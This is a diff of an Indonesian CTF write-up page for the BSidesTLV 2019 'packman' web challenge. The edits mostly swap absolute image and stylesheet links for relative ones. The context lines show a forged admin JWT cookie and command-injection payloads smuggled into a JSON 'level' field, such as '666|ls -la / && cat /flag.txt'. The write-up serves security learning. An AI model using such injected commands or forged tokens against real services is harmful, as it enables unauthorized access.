@@ -16,9 +16,9 @@
     <meta name="twitter:title" content="Hello World">
     <meta name="twitter:description" content="An software engineer guy who loves write code and learn about security & reversing">
     <!-- title -->
-    <title>Hello World</title>
+    <title>Writeup BSIDESTLV web packman</title>
     <!-- styles -->
-    <link rel="stylesheet" href="http://sohainewbie.github.io/assets/css/style.css">
+    <link rel="stylesheet" href="../assets/css/style.css">
 
     <style type="text/css">
         .code-container{
@@ -54,7 +54,7 @@
 
             kita buka di browser alamat <span>http://pacman.challenges.bsidestlv.com/</span> maka akan muncul tulisan <span style="color:red;">You are not authorized!</span>
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/1.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/1.png" style="width: 862px;height: 400px;">
             
             mari kita check path `/` pada challenge.js
             <div class="code-container">
@@ -154,21 +154,21 @@
             </pre>
             </div>
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/3.png" style="width: 862px;height: 95px;">
+            <img src="../images/bsidestlv2019-packman/3.png" style="width: 862px;height: 95px;">
 
             output <span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJpYXQiOjE1NjAyNzkzNzJ9.-laaimCkf8gJnaCO7ztF_YMc0Xlsq3xVU53oN4RuH24</span>
 
             maka nanti pada cookies kita set <span>auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJpYXQiOjE1NjAyNzkzNzJ9.-laaimCkf8gJnaCO7ztF_YMc0Xlsq3xVU53oN4RuH24</span>
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/4.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/4.png" style="width: 862px;height: 400px;">
 
             muncul sebuah halaman berupa game packman,
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/5.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/5.png" style="width: 862px;height: 400px;">
 
             kita viewsource 
 
-           <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/6.png" style="width: 862px;height: 400px;">
+           <img src="../images/bsidestlv2019-packman/6.png" style="width: 862px;height: 400px;">
 
             maka kita temukan sebuah event handler ketika user mengclick `levelUp` maka ada proses ajax berupa 
 
@@ -180,7 +180,7 @@
 
             maka kita coba request lagi.
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/7.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/7.png" style="width: 862px;height: 400px;">
 
 
             output berupa <span>Level up!</span>
@@ -210,13 +210,13 @@
 
             <span>{"level":"666|ls -la && pwd && id"}</span>
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/8.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/8.png" style="width: 862px;height: 400px;">
 
             maka kita hanya mencari flag dimana
 
             <span>{"level":"666|ls -la / && cat /flag.txt"}</span>
 
-            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/9.png" style="width: 862px;height: 400px;">
+            <img src="../images/bsidestlv2019-packman/9.png" style="width: 862px;height: 400px;">
 
             setelah itu flag nya adalah <span>BSidesTLV{H1dd3nPacmanLevelUP!}</span>
 
